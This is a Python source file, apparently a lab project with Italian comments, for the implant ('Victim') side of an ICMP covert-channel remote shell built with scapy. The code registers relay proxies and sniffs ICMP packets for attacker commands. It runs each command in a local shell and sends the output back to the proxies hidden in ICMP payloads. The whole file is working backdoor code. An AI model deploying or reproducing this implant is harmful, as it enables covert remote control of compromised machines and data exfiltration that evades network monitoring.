#from scapy.all import * 
from scapy.all import IP, ICMP, Raw, AsyncSniffer

import sys
import os
import argparse
import random 
import threading
import sys
import select  
import ipaddress

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods  

file_path = "./type_singleton.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import type_singleton as singleton


WAITING_TIME=10
#---------------------- 



#---------------------
def send_lastpacket_toall_proxies(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=None):
    try:
        com.is_list(proxy_list)
    except Exception as e:
        raise Exception(f"send_lastpacket_toall_proxies: {e}")
    print(f"aggiorniamo i proxy; questo è l'ultimo pacchetto")
    unavailable_proxy=[]
    for proxy in proxy_list: 
        data=(com.LAST_PACKET).encode()
        ans=com.send_packet(data, proxy, icmp_seq=0)
        if not ans:
            unavailable_proxy.append(proxy)
    return unavailable_proxy

def choose_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=None):
    print(f"I proxy utilzzabili sono: {len(proxy_list)}\n\t{proxy_list}")
    try: 
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError("choose_proxy: Lista non accettata")
    except Exception as e:
        raise ValueError(f"choose_proxy: {e}")
    return random.choice(proxy_list) 

def get_data_from_command(process_shell):
    print(f"Did command failed? {process_shell.poll() is not None}") 
    data=[]
    there_is_smth_to_read=True
    while there_is_smth_to_read: 
        print("lettura dei dati...")
        reads = [process_shell.stderr.fileno(),process_shell.stdout.fileno()] 
        ret = select.select(reads, [], [], 1.0)  # 1s timeout for safety 
        for fd in ret[0]:
            if fd == process_shell.stdout.fileno(): 
                output_line = process_shell.stdout.readline()
                if output_line:
                    stripped_data=output_line.strip()
                    print("stdout:",stripped_data)
                    data.append(stripped_data) 
                    if com.END_DATA.strip() in stripped_data:
                        print(f"No more lines to read")
                        there_is_smth_to_read = False
                else:
                    print(f"stdout EOF {output_line}") 
                    there_is_smth_to_read = False
            if fd == process_shell.stderr.fileno(): 
                error_line = process_shell.stderr.readline()
                if error_line:
                    stripped_data=error_line.strip()
                    data.append(stripped_data)
                    print("stderr:", stripped_data) 
                else:
                    print(f"stderr EOF {output_line}") 
                    there_is_smth_to_read = False  
        # Optional: check if process exited early
        #if process_shell.poll() is not None and there_is_smth_to_read:
            #print("Process exited but streams may still have data")
    print(f"Command finished with exit code {process_shell.poll()}")
    return data 

def check_system_compatibility():
    supportedSystems=["linux","win32"] 
    if sys.platform not in supportedSystems:
        return False
    return True 

def execute_command(command): 
        try:
            if com.is_bytes(command):
                command=command.decode()
        except Exception as e: 
            try:
                if not com.is_string(command):
                    command=str(command) 
            except Exception as e:
                raise Exception(f"execute_command: {e}")
        try:
            if not check_system_compatibility(): 
                raise Exception(f"execute_command: {sys.platform} non supportato...")
        except Exception as e:
            raise Exception(f"execute_command: {e}")
        print("Sistema supportato...")
        try:
            process_shell=mymethods.getShellProcess()
            com.is_valid_shell(process_shell)
            print("Shell aperta con successo...")
        except Exception as e:
            raise Exception(f"execute_command: {e}")
        try:
            print(f"Esecuzione del comando {command}")
            process_shell.stdin.write(f"{command.replace('\n','' '')}; echo {com.END_DATA}\n")
            process_shell.stdin.flush() 
            print(f"comando eseguito...") 
            return process_shell 
        except Exception as e:
            raise Exception(f"execute_command: {e}") 

def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
    def callback(packet):
        nonlocal comando, connected_proxy, event_pktconn
        print(f"callback wait_for_command received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and com.CONFIRM_COMMAND.encode() in packet[Raw].load:
                comando.append(packet[Raw].load.decode().replace(com.CONFIRM_COMMAND,""))
                checksum=mymethods.calc_checksum((com.CONFIRM_COMMAND+comando[0]).encode())
                print(f"Payload: {packet[Raw].load} and ICMP ID: {packet[ICMP].id}") 
                if packet[ICMP].id==checksum: 
                    print(f"Ricevuto il comando {comando}")
                    com.set_threading_Event(event_pktconn)
                    return 
            if ipaddress.ip_address(packet[IP].src) not in connected_proxy:
                print(f"Received packet from not recognized address {packet[IP].src}")
            if com.CONFIRM_COMMAND.encode() not in packet[Raw].load:
                print(f"Payload doesn't have com.CONFIRM_COMMAND {packet[Raw].load}")
    return callback
    

#-------------------------------------
def ask_to_continue(msg:str="PLACEHOLDER MESSAGE [si/no]"):
    scelta=input(f"{msg}")
    if scelta.lower() in ["s","si","yes","y"]:
        print("Si è scelto di SI")
        return True
    else:
        print("Si è scelto di NO") 
        return False

def done_waiting_timeout(sniffer, enough_proxy_timer:threading.Timer, event_enough_proxy:threading.Event, callback_reached_proxy_number):
    try:
        com.is_AsyncSniffer(sniffer)
        com.is_threading_Timer(enough_proxy_timer)
        com.is_threading_Event(event_enough_proxy)
    except Exception as e:
        raise Exception(f"done_waiting_timeout: {e}")
    if not callback_reached_proxy_number(): 
        print("Not enough proxies have arrived") 
        msg="Continuare ad aspettare ulteriori proxy? (s/n)"
        if ask_to_continue(msg):
            print("Continuo ad aspettare...")
            enough_proxy_timer = threading.Timer(
                WAITING_TIME
                ,lambda: done_waiting_timeout(sniffer, enough_proxy_timer, event_enough_proxy, callback_reached_proxy_number))
            enough_proxy_timer.start()
            return
        else:
            print("Smetto di aspettare...") 
    print("Enough proxies have arrived") 
    com.set_threading_Event(event_enough_proxy)

#----------------
def reached_proxy_number(lock_connected_proxy:threading.Lock, connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address], num_proxy:int):
    lock_connected_proxy.acquire()
    is_enough_proxy=len(connected_proxy) >= num_proxy
    lock_connected_proxy.release() 
    if is_enough_proxy: 
        print(f"Raggiunto il numero ({num_proxy}) di proxy necessari:\n\t{connected_proxy}")
        return True 
    print(f"Necessari ancora {num_proxy-len(connected_proxy)} proxy")
    return False

def add_proxy_to_connected_list(connected_proxy:list, ip_src:ipaddress.IPv4Address|ipaddress.IPv6Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int): 
    lock_connected_proxy.acquire()
    if ip_src not in connected_proxy:
        connected_proxy.append(ip_src) 
    lock_connected_proxy.release() 
    print(f"{ip_src} aggiunto alla lista dei proxy connessi\n\t{connected_proxy}")
    #msg="Numero minimo di proxy raggiunto. Se ne vogiono aspettare di più? [s/n]"
    if reached_proxy_number(lock_connected_proxy, connected_proxy, num_proxy): # and ask_to_continue(msg)
        com.set_threading_Event(event_enough_proxy) 

def is_proxy_already_connected(proxy:ipaddress.IPv4Address|ipaddress.IPv6Address ,connected_proxy:list, lock_connected_proxy:threading.Lock):
    try:
        if not com.is_valid_ipaddress_v4(proxy):
            raise Exception(f"done_waiting_timeout: proxy indirizzo non valido")
    except Exception as e:
        raise Exception(f"done_waiting_timeout: {e}")
    lock_connected_proxy.acquire()
    is_already_connected= proxy in connected_proxy
    lock_connected_proxy.release() 
    return is_already_connected 

def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int): 
    def callback(packet):
        print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
            print(f"Ricevuto pacchetto da {packet[IP].src}...")
            ip_src=ipaddress.ip_address(packet[IP].src)
            if is_proxy_already_connected(ip_src, connected_proxy, lock_connected_proxy): 
                print(f"already connected with {ip_src}:\n\t{connected_proxy}")
                return
            confirm_text=(com.CONFIRM_PROXY+ip_host.compressed).encode()
            checksum=mymethods.calc_checksum(confirm_text) 
            if confirm_text in packet[Raw].load and checksum==packet[ICMP].id: 
                #confirm_conn_to_proxy
                data=(com.CONFIRM_VICTIM+ip_host.compressed+ip_src.compressed).encode()
                if com.send_packet(data,ip_src): 
                    add_proxy_to_connected_list(
                        connected_proxy
                        ,ip_src
                        ,event_enough_proxy
                        ,lock_connected_proxy
                        ,num_proxy
                    ) 
                    print(f"Il pacchetto ha confermato la connessione per {ip_src}") 
                    return
                print(f"{ip_src} non ha risposto al messaggio di conferma. ") 
        print(f"Il pacchetto non ha confermato la connessione...")
    return callback
     

#----------------
def stop_timer(timer:threading.Timer=None):
    try:
        if not com.is_threading_Timer(timer):
            raise Exception(f"stop_timer: timer non valido")
    except Exception as e:
        raise Exception(f"stop_timer: {e}")
    if timer.is_alive():
        timer.cancel() 
        print("Timer Stopped")
        return True
    return False

def stop_sinffer(sniffer=None):
    try:
        if not com.is_AsyncSniffer(sniffer):
            raise Exception(f"stop_sinffer: sniffer non valido")
    except Exception as e:
        raise Exception(f"stop_sinffer: {e}")
    if sniffer.running: 
        sniffer.stop() 
        print("Sniffer Stopped")
        return True
    return False

#--------- 
def check_value_in_parser(args): 
    try:
        if not isinstance(args,argparse.Namespace):
            raise Exception("Argomento parser non è istanza di argparse.Namespace")  
        if not isinstance(args.num_proxy, int):
            raise ValueError("Il numero di proxy non è un intero") 
    except Exception as e: 
        raise Exception(f"check_value_in_parser: {e}") 
    return True 

def get_args_from_parser(): 
    parser = argparse.ArgumentParser()
    #parser.add_argument("--ip_host",type=str, help="L'IP dell host dove ricevere i pacchetti ICMP")
    parser.add_argument("--num_proxy",type=int, help="Numero dei proxy necessari")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")    
    try:
        args, unknown =mymethods.check_for_unknown_args(parser)  
        if len(unknown) > 0: 
            raise Exception(f"Argomenti sconosciuti: {unknown}") 
        if check_value_in_parser(args):  
            return args
    except Exception as e:
        mymethods.print_parser_supported_arguments(parser)
        raise Exception(f"get_args_from_parser: {e}")

class Victim:
    def __init__(self):
        try: 
            ip_host, errore=mymethods.find_local_IP()
            ip_host="192.168.56.102" #TOD delete after
            if ip_host is None: 
                raise Exception(f"Coulnd't get ip: {errore}")
            self.ip_host=ipaddress.ip_address(ip_host)
            if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
                raise ValueError("args non è istanza di argparse.Namespace") 
            dict_values={
                "num_proxy":args.num_proxy  
            }
            self.num_proxy=dict_values.get("num_proxy")
            print(f"num_proxy: {type(self.num_proxy)} {self.num_proxy}")
        except Exception as e:
            print(f"Eccezione: {e}")
            exit(1) 
        
        try: 
            self.connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
            self.lock_connected_proxy=threading.Lock() 
            self.wait_conn_from_proxy() 
            if len(self.connected_proxy) < self.num_proxy: 
                print(f"Non sono stati trovati abbastanza proxy ({self.connected_proxy})")
                msg="Utilizzare comunque quelli trovati? [si/no]"
                if len(self.connected_proxy)<=0 or not ask_to_continue(msg) :
                    print("Interruzione del programma...")  
                    exit(0)
                else:
                    print("Continuo con i proxy trovati...")  
        except Exception as e:
            print(f"Eccezione: {e}")
            exit(1) 
        
        try:
            #wait_command_send_data
            self.wait_attacker_command() 
            process_shell=None
            while self.command and self.command not in com.exit_cases:
                try: 
                    process_shell=execute_command(self.command)
                    com.is_valid_shell(process_shell) 
                    data=get_data_from_command(process_shell) 
                    self.send_data_to_proxies(data) 
                    self.wait_attacker_command()
                except Exception as e:
                    print(f"wait_command_send_data: {e}")
            try:
                if process_shell is not None and com.is_valid_shell(process_shell):
                    process_shell.wait()  # Attende la chiusura del processo
                    process_shell.terminate()  # Termina il processo 
            except Exception as e:
                raise Exception(f"wait_command_send_data: {e}") 
        except Exception as e:
            print(f"Eccezione: {e}")
            exit(1)

    def wait_conn_from_proxy(self): 
        try:
            confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed
            checksum=mymethods.calc_checksum(confirm_text.encode())
            self.event_enough_proxy=com.get_threading_Event() 
            interface=mymethods.default_iface()
            filter=singleton.AttackType().get_filter_connection_from_function(
                "victim_wait_conn_from_proxy"
                ,checksum=checksum
                ,ip_dst=self.ip_host
            ) 
        except Exception as e:
            print(f"Eccezione: {e}") 

        args={
            "filter": filter
            #,"count":1 
            ,"prn":callback_wait_conn_from_proxy(
                self.connected_proxy
                ,self.ip_host
                ,self.event_enough_proxy
                ,self.lock_connected_proxy
                ,self.num_proxy
            )
            #,"store":True 
            ,"iface":interface
        }  
        try:  
            callback_function_timer = lambda: done_waiting_timeout(
                self.sniffer
                ,self.enough_proxy_timer
                ,self.event_enough_proxy
                ,lambda: reached_proxy_number(
                    self.lock_connected_proxy
                    ,self.connected_proxy
                    ,self.num_proxy
                )
            )
            self.sniffer,self.enough_proxy_timer=com.sniff_packet_w_callbak(
                 args,WAITING_TIME,callback_function_timer
            )
            com.wait_threading_Event(self.event_enough_proxy)  
        except Exception as e:
            raise Exception(f"wait_conn_from_proxy: {e}") 
        stop_sinffer(self.sniffer)
        stop_timer(self.enough_proxy_timer) 
        print(f"I proxy utilzzabili sono {len(self.connected_proxy)}: {self.connected_proxy}") 
            
    def wait_attacker_command(self): 
        self.command=[]
        print("Waiting for a command...") 
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_attacker_command"
            ,ip_dst=self.ip_host
        )
        interface=mymethods.default_iface() 
        self.event_pktconn=com.get_threading_Event()

        args={
            "filter":filter
            #,"count":1 
            ,"prn":callback_wait_for_command(
                self.connected_proxy
                ,self.event_pktconn
                ,self.command
            )
            #,"store":True 
            ,"iface":interface
        }
        try: 
            self.sniffer,self.timeout_timer=com.sniff_packet(
                 args
                ,timeout_time=None
                ,event=self.event_pktconn
            ) 
            com.wait_threading_Event(self.event_pktconn) 
            if len(self.command)==1:
                self.command=self.command[0]
            elif len(self.command)>1:
                print(f"Errore multipli comandi: {self.command}")
                self.command=self.command[0]
            elif len(self.command)<1: 
                print(f"Errore nessun comando: {self.command}")
                self.command=com.END_COMMUNICATION
                
        except Exception as e:
            raise Exception(f"wait_attacker_command: {e}") 
        print(f"Comando ricevuto: {self.command}") 
        stop_sinffer(self.sniffer)
        stop_timer(self.timeout_timer)  

    def send_data_to_proxies(self,data_to_send:list=None):
        try: 
            if not com.is_list(data_to_send) or len(data_to_send)<=0:
                raise ValueError(f"send_data_to_proxies: nessun dato presente {data_to_send}")
        except Exception as e:
            raise ValueError(f"send_data_to_proxies: {e}")  
        chosen_proxy=choose_proxy(self.connected_proxy) 
        print(f"Il proxy scelto è {chosen_proxy}") 
        #print("I dati che verranno mandati a", chosen_proxy," sono: ",data_to_send) 
        data_has_being_sent=False
        sequenza=0
        for data in data_to_send:
            if com.END_DATA in data:
                print(f"data={data}")
                try: 
                    unavailable_proxy=send_lastpacket_toall_proxies(self.connected_proxy)  
                    print(f"Proxy che non hanno ricevuto l'aggiornamento {unavailable_proxy}")
                    for proxy in unavailable_proxy:
                        self.connected_proxy.remove(proxy)
                    print(f"Proxy che hanno ricevuto l'aggiornamento {self.connected_proxy}")
                except Exception as e:
                    raise Exception(f"send_data_to_proxies: {e}")
                break
            data=data if isinstance(data,bytes) else data.encode()
            print(f"PROVA {data}")
            data_has_being_sent=com.send_packet(
                 data
                ,chosen_proxy
                ,icmp_seq=sequenza
            ) 
            if not data_has_being_sent:
                print(f"{chosen_proxy} non ha ricevuto i dati") 
                self.connected_proxy.remove(chosen_proxy)
                for proxy in self.connected_proxy.copy():
                    print(f"proviamo il proxy {proxy}")
                    if com.send_packet( data,proxy,icmp_seq=sequenza): 
                        chosen_proxy=proxy 
                        print(f"scelto il nuovo proxy {chosen_proxy}")
                        break
                    self.connected_proxy.remove(proxy) 
                    print(f"rimosso il proxy {proxy}")
            else:
                print(f"{chosen_proxy} ha ricevuto i dati")
            sequenza+=1

if __name__ == "__main__": 
    Victim()   
    